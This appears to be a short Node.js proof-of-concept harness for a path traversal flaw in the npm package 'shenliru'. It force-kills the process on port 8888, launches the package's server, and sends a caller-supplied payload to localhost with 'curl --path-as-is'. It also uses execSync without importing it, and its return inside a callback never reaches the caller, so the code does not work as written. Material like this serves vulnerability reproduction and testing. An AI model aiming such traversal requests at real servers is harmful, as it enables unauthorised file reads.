function exploitFunction(payload) {
  const { exec } = require("child_process");
  const sleep = require("sleep");
  const path = require("path");

  // Clean up the server port
  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  // Start the server
  let server = "node ./node_modules/shenliru/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  // Craft the attack string using the payload
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  // Execute the attack
  exec(attack_string, (error, stdout) => {
    if (stdout) {
      return stdout;
    }
    throw new Error("Failed to execute attack");
  });
}

module.exports = { exploitFunction };